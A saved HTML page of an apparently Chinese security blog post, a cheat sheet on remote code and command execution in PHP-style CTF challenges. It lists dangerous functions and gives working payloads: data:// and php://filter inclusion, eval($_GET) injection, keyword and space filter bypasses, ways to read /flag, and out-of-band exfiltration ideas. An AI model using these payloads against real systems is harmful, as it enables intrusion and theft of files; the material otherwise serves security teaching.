@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RCE：代码执行/命令执行/绕过技巧</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@RCE 代码 &amp; 命令执行 &amp; 过滤绕过 &amp; 异或无字符 &amp; 无回显方案 &amp; 黑白盒挖掘">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/rce/rce/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="RCE：代码执行/命令执行/绕过技巧" />
+<meta property="og:description" content="RCE 代码 &amp; 命令执行 &amp; 过滤绕过 &amp; 异或无字符 &amp; 无回显方案 &amp; 黑白盒挖掘" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/rce/rce/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-05-05T10:56:54+08:00" />
+<meta property="article:modified_time" content="2024-05-05T10:56:54+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RCE：代码执行/命令执行/绕过技巧"/>
+<meta name="twitter:description" content="RCE 代码 &amp; 命令执行 &amp; 过滤绕过 &amp; 异或无字符 &amp; 无回显方案 &amp; 黑白盒挖掘"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "RCE",
+      "item": "http://118.178.86.67/list/base_bug/rce/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "RCE：代码执行/命令执行/绕过技巧",
+      "item": "http://118.178.86.67/list/base_bug/rce/rce/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RCE：代码执行/命令执行/绕过技巧",
+  "name": "RCE：代码执行\/命令执行\/绕过技巧",
+  "description": "RCE 代码 \u0026amp; 命令执行 \u0026amp; 过滤绕过 \u0026amp; 异或无字符 \u0026amp; 无回显方案 \u0026amp; 黑白盒挖掘\n",
+  "keywords": [
+    "RCE", "绕过", "异或", "无回显"
+  ],
+  "articleBody": "RCE 代码 \u0026 命令执行 \u0026 过滤绕过 \u0026 异或无字符 \u0026 无回显方案 \u0026 黑白盒挖掘\n概览 ➢ RCE — 利用 / 绕过 / 异或 / 回显 ➢ 白盒 — CTF / RCE 代码命令执行 ➢ 黑盒 — 运行 / RCE 代码命令执行 定义\nRCE 代码执行：引用脚本代码并解析执行。 RCE 命令执行：脚本调用操作系统命令。 漏洞函数（语言分类） 1. PHP 代码执行相关函数\neval(), assert(), preg_replace(), create_function(), array_map(), call_user_func(), call_user_func_array(), array_filter(), uasort(), ... 命令执行相关函数\nsystem(), exec(), shell_exec(), pcntl_exec(), popen(), proc_open(), passthru(), ... 2. Python eval, exec, subprocess, os.system, commands, ... 3. Java Java 没有 PHP 那样直接的 eval，但存在反射与多种表达式引擎（OGNL、SpEL、MVEL 等），可被用作代码执行入口。\n产生渠道、检测与防御（通用）\n产生：web 源码、中间件平台、其他环境。 白盒检测：代码审计。 黑盒检测：漏洞扫描工具、公开漏洞、手工测试参数与功能点。 防御：禁用敏感函数、输入变量过滤或固定、WAF 产品。 RCE：利用、绕过、异或与回显技巧 1. 伪协议玩法（配合文件包含达到代码执行） include $_GET['a']?\u003e\u0026a=data://text/plain,\u003c?php system('ver');?\u003e include $_GET['a']?\u003e\u0026a=php://filter/read=convert.base64-encode/resource=index.php 关键字过滤绕过（举例与技巧） 过滤敏感关键字（如 flag） 通配符：fl* → cat fl*，?la* 等\n转义：ca\\t、fl\\ag、cat fl''ag\n空变量/位置替换：ca$*t fl$*ag、ca$@t fl$@ag、ca${2}t f${2}lag\n拼接：a=fl;b=ag;cat$IFS$a$b\n反引号与编码：\ncat `echo ZmxhZwo= | base64 -d` 环境变量截取：echo f${PATH:5:1}\n异或 / 无字符（过滤 0-9a-zA-Z） 使用现成脚本：rce-xor.php, rce-xor.py 或 rce-xor-or.php 等。 过滤函数关键字绕过 内嵌执行（绕过 system 关键字） echo `ls`; echo $(ls); ?\u003e\u003c?=`ls`?\u003e ?\u003e\u003c?=$(ls)?\u003e 替代查看文件的工具（当 cat 被过滤时） more, less, head, tac（反向 cat）、tail, nl, od, vi, vim, sort, uniq, file -f 等 利用程序报错行为输出文件：sh /flag 2\u003e%261 直接通过 file URL：curl file:///root/f/flag 二进制/字符串方法：strings flag, dd if=/flag bs=1M 空格过滤绕过 URL 编码制表符：%09（如 cat%09flag.php） 使用 $IFS：cat${IFS}flag 拼接变量：a=fl;b=ag;cat$IFS$a$b 花括号花式：{cat,flag} 重定向：cat",
+  "wordCount" : "268",
+  "inLanguage": "en",
+  "datePublished": "2024-05-05T10:56:54+08:00",
+  "dateModified": "2024-05-05T10:56:54+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/rce/rce/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>RCE：代码执行/命令执行/绕过技巧</h1>
+  </header>
+
+  <p>
+  <small>
+    May 5, 2024&nbsp;· 268 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#概览">概览</a></li>
+    <li><a href="#漏洞函数语言分类">漏洞函数（语言分类）</a>
+      <ul>
+        <li><a href="#1-php">1. PHP</a></li>
+        <li><a href="#2-python">2. Python</a></li>
+        <li><a href="#3-java">3. Java</a></li>
+      </ul>
+    </li>
+    <li><a href="#rce利用绕过异或与回显技巧">RCE：利用、绕过、异或与回显技巧</a>
+      <ul>
+        <li><a href="#1-伪协议玩法配合文件包含达到代码执行">1. 伪协议玩法（配合文件包含达到代码执行）</a></li>
+        <li><a href="#关键字过滤绕过举例与技巧">关键字过滤绕过（举例与技巧）</a></li>
+        <li><a href="#过滤函数关键字绕过">过滤函数关键字绕过</a></li>
+        <li><a href="#无回显利用思路">无回显利用思路</a></li>
+      </ul>
+    </li>
+    <li><a href="#白盒ctf与黑盒示例技巧">白盒（CTF）与黑盒示例技巧</a>
+      <ul>
+        <li><a href="#白盒示例">白盒示例</a></li>
+        <li><a href="#配合包含与伪协议示例">配合包含与伪协议（示例）</a></li>
+        <li><a href="#包含--通配符示例">包含 + 通配符（示例）</a></li>
+        <li><a href="#黑盒">黑盒</a></li>
+      </ul>
+    </li>
+    <li><a href="#调试--查看文件常用片段">调试 / 查看文件常用片段</a>
+      <ul>
+        <li><a href="#无参数文件读取技巧利用-localeconv">无参数文件读取技巧（利用 localeconv）</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><p><em>RCE 代码 &amp; 命令执行 &amp; 过滤绕过 &amp; 异或无字符 &amp; 无回显方案 &amp; 黑白盒挖掘</em></p>
+<h2 id="概览">概览</h2>
+<ul>
+<li>➢ RCE — 利用 / 绕过 / 异或 / 回显</li>
+<li>➢ 白盒 — CTF / RCE 代码命令执行</li>
+<li>➢ 黑盒 — 运行 / RCE 代码命令执行</li>
+</ul>
+<p><strong>定义</strong></p>
+<ul>
+<li><strong>RCE 代码执行</strong>：引用脚本代码并解析执行。</li>
+<li><strong>RCE 命令执行</strong>：脚本调用操作系统命令。</li>
+</ul>
+<hr>
+<h2 id="漏洞函数语言分类">漏洞函数（语言分类）</h2>
+<h3 id="1-php">1. PHP</h3>
+<p><strong>代码执行相关函数</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>(), <span style="color:#a6e22e">assert</span>(), <span style="color:#a6e22e">preg_replace</span>(), <span style="color:#a6e22e">create_function</span>(), <span style="color:#a6e22e">array_map</span>(), <span style="color:#a6e22e">call_user_func</span>(), <span style="color:#a6e22e">call_user_func_array</span>(), <span style="color:#a6e22e">array_filter</span>(), <span style="color:#a6e22e">uasort</span>(), <span style="color:#f92672">...</span>
+</span></span></code></pre></div><p><strong>命令执行相关函数</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>system(), exec(), shell_exec(), pcntl_exec(), popen(), proc_open(), passthru(), ...
+</span></span></code></pre></div><h3 id="2-python">2. Python</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>eval, exec, subprocess, os.system, commands, ...
+</span></span></code></pre></div><h3 id="3-java">3. Java</h3>
+<p>Java 没有 PHP 那样直接的 <code>eval</code>，但存在反射与多种表达式引擎（OGNL、SpEL、MVEL 等），可被用作代码执行入口。</p>
+<p><strong>产生渠道、检测与防御（通用）</strong></p>
+<ul>
+<li>产生：web 源码、中间件平台、其他环境。</li>
+<li>白盒检测：代码审计。</li>
+<li>黑盒检测：漏洞扫描工具、公开漏洞、手工测试参数与功能点。</li>
+<li>防御：禁用敏感函数、输入变量过滤或固定、WAF 产品。</li>
+</ul>
+<hr>
+<h2 id="rce利用绕过异或与回显技巧">RCE：利用、绕过、异或与回显技巧</h2>
+<h3 id="1-伪协议玩法配合文件包含达到代码执行">1. 伪协议玩法（配合文件包含达到代码执行）</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>include $_GET[&#39;a&#39;]?&gt;&amp;a=data://text/plain,&lt;?php system(&#39;ver&#39;);?&gt;
+</span></span><span style="display:flex;"><span>include $_GET[&#39;a&#39;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php
+</span></span></code></pre></div><hr>
+<h3 id="关键字过滤绕过举例与技巧">关键字过滤绕过（举例与技巧）</h3>
+<h4 id="过滤敏感关键字如-flag">过滤敏感关键字（如 <code>flag</code>）</h4>
+<ul>
+<li>
+<p>通配符：<code>fl*</code> → <code>cat fl*</code>，<code>?la*</code> 等</p>
+</li>
+<li>
+<p>转义：<code>ca\t</code>、<code>fl\ag</code>、<code>cat fl''ag</code></p>
+</li>
+<li>
+<p>空变量/位置替换：<code>ca$*t fl$*ag</code>、<code>ca$@t fl$@ag</code>、<code>ca${2}t f${2}lag</code></p>
+</li>
+<li>
+<p>拼接：<code>a=fl;b=ag;cat$IFS$a$b</code></p>
+</li>
+<li>
+<p>反引号与编码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cat `echo ZmxhZwo= | base64 -d`
+</span></span></code></pre></div></li>
+<li>
+<p>环境变量截取：<code>echo f${PATH:5:1}</code></p>
+</li>
+</ul>
+<h4 id="异或--无字符过滤-0-9a-za-z">异或 / 无字符（过滤 0-9a-zA-Z）</h4>
+<ul>
+<li>使用现成脚本：<code>rce-xor.php</code>, <code>rce-xor.py</code> 或 <code>rce-xor-or.php</code> 等。</li>
+</ul>
+<hr>
+<h3 id="过滤函数关键字绕过">过滤函数关键字绕过</h3>
+<ol>
+<li><strong>内嵌执行</strong>（绕过 <code>system</code> 关键字）</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span>echo <span style="color:#f92672">`</span>ls<span style="color:#f92672">`</span>;
+</span></span><span style="display:flex;"><span>echo <span style="color:#960050;background-color:#1e0010">$</span>(ls);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?&gt;&lt;?=`</span>ls<span style="color:#f92672">`?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?&gt;&lt;?=</span><span style="color:#960050;background-color:#1e0010">$</span>(ls)<span style="color:#f92672">?&gt;</span>
+</span></span></code></pre></div><ol>
+<li><strong>替代查看文件的工具</strong>（当 <code>cat</code> 被过滤时）</li>
+</ol>
+<ul>
+<li><code>more</code>, <code>less</code>, <code>head</code>, <code>tac</code>（反向 <code>cat</code>）、<code>tail</code>, <code>nl</code>, <code>od</code>, <code>vi</code>, <code>vim</code>, <code>sort</code>, <code>uniq</code>, <code>file -f</code> 等</li>
+<li>利用程序报错行为输出文件：<code>sh /flag 2&gt;%261</code></li>
+<li>直接通过 file URL：<code>curl file:///root/f/flag</code></li>
+<li>二进制/字符串方法：<code>strings flag</code>, <code>dd if=/flag bs=1M</code></li>
+</ul>
+<ol>
+<li><strong>空格过滤绕过</strong></li>
+</ol>
+<ul>
+<li>URL 编码制表符：<code>%09</code>（如 <code>cat%09flag.php</code>）</li>
+<li>使用 <code>$IFS</code>：<code>cat${IFS}flag</code></li>
+<li>拼接变量：<code>a=fl;b=ag;cat$IFS$a$b</code></li>
+<li>花括号花式：<code>{cat,flag}</code></li>
+<li>重定向：<code>cat&lt;flag</code>、<code>cat&lt;&gt;flag</code></li>
+</ul>
+<ol>
+<li><strong>拼接与命令连接</strong></li>
+</ol>
+<ul>
+<li><code>;</code>、<code>||</code>、<code>|</code>、<code>&amp;</code>、<code>&amp;&amp;</code>（注意 URL 编码问题）</li>
+</ul>
+<hr>
+<h3 id="无回显利用思路">无回显利用思路</h3>
+<ul>
+<li>直接写文件并通过可访问路径读取。</li>
+<li>让目标对外发起请求（回传数据到你的服务器或服务）。</li>
+</ul>
+<p><strong>常用命令连接符说明</strong></p>
+<ul>
+<li><code>;</code>：顺序执行</li>
+<li><code>|</code>：管道</li>
+<li><code>||</code>：前一命令失败才执行后一条</li>
+<li><code>&amp;</code>：后台执行/同时执行（shell 语义）</li>
+<li><code>&amp;&amp;</code>：前一命令成功才执行后一条</li>
+</ul>
+<hr>
+<h2 id="白盒ctf与黑盒示例技巧">白盒（CTF）与黑盒示例技巧</h2>
+<h3 id="白盒示例">白盒示例</h3>
+<ul>
+<li>通配符技巧：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>system(&#39;tac fla*.php&#39;);
+</span></span></code></pre></div><ul>
+<li>参数逃逸与 <code>eval</code>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>eval($_GET[1]);  // &amp;1=system(&#39;tac flag.php&#39;);
+</span></span></code></pre></div><h3 id="配合包含与伪协议示例">配合包含与伪协议（示例）</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// 过滤了分号时，用 ?&gt; 作为分隔替代 ;
+</span></span><span style="display:flex;"><span>include $_GET[&#39;a&#39;] ?&gt; &amp;a=data://text/plain,&lt;?=system(&#39;tac flag.php&#39;);?&gt;
+</span></span><span style="display:flex;"><span>include $_GET[&#39;a&#39;] ?&gt; &amp;a=php://filter/read=convert.base64-encode/resource=flag.php
+</span></span></code></pre></div><h3 id="包含--通配符示例">包含 + 通配符（示例）</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>data://text/plain,&lt;?php system(&#39;tac fla*&#39;);?&gt;
+</span></span><span style="display:flex;"><span>php://input  // post: &lt;?php system(&#39;tac flag.php&#39;); ?&gt;
+</span></span></code></pre></div><h3 id="黑盒">黑盒</h3>
+<ul>
+<li>使用在线代码运行平台或沙箱进行检测与试验。</li>
+</ul>
+<hr>
+<h2 id="调试--查看文件常用片段">调试 / 查看文件常用片段</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// 列出当前目录
+</span></span><span style="display:flex;"><span>a = print_r(glob(&#34;*&#34;));
+</span></span><span style="display:flex;"><span>var_dump(glob(&#34;*&#34;));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 读取根目录
+</span></span><span style="display:flex;"><span>print_r(scandir(&#34;/&#34;));
+</span></span><span style="display:flex;"><span>var_dump(scandir(&#34;/&#34;));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 查看文件
+</span></span><span style="display:flex;"><span>var_dump(file_get_contents(&#39;/flag&#39;));
+</span></span><span style="display:flex;"><span>a = highlight_file(&#34;index.php&#34;);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 查找文件
+</span></span><span style="display:flex;"><span>find / -name flag*
+</span></span></code></pre></div><h3 id="无参数文件读取技巧利用-localeconv">无参数文件读取技巧（利用 localeconv）</h3>
+<ul>
+<li><code>localeconv()</code> 返回数组，第一个值为小数点符号（通常是点），可以用来获取数组第一个元素的引用：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>print_r(scandir(current(localeconv())));
+</span></span><span style="display:flex;"><span>print_r(scandir(pos(localeconv())));
+</span></span><span style="display:flex;"><span>print_r(scandir(reset(localeconv())));
+</span></span><span style="display:flex;"><span>var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));
+</span></span></code></pre></div><p>（思路：scandir 返回目录数组，翻转、next 等配合可定位到目标文件）</p></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/csrf/csrf/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>CSRF 防护实践：检测、绕过与防御</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up1/"><span>文件上传：解析、存储与安全最佳实践</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
